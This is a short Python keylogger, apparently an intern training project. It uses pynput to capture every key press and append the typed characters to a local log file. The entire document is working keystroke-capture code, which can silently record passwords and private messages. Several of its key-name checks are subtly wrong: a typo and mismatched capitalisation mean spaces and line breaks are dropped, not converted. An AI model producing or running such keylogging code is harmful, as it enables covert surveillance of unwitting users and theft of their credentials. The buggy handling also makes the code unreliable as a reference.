from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    if keydata == "ikey.space":
        keydata = "  "
    if keydata == "key.shift_r":
        keydata = ""
    if keydata == "Key.ctrl_l":
        keydata = ""
    if keydata == "key.enter":
        keydata = "\n"
    if keydata == "key.shift_l":
        keydata = ""
    if keydata == "key.ctrl_r":
        keydata = ""
    if keydata == "key.tab":
        keydata = ""
    if keydata == "Key.backspace":
        keydata = ""
    if keydata == "Key.cmd":
        keydata = ""
    if keydata.startswith("Key."):
        keydata = ""
    with open("D:\intern projects\Pinnacle labs\Keylogger software\Log.txt", 'a') as f:
        f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()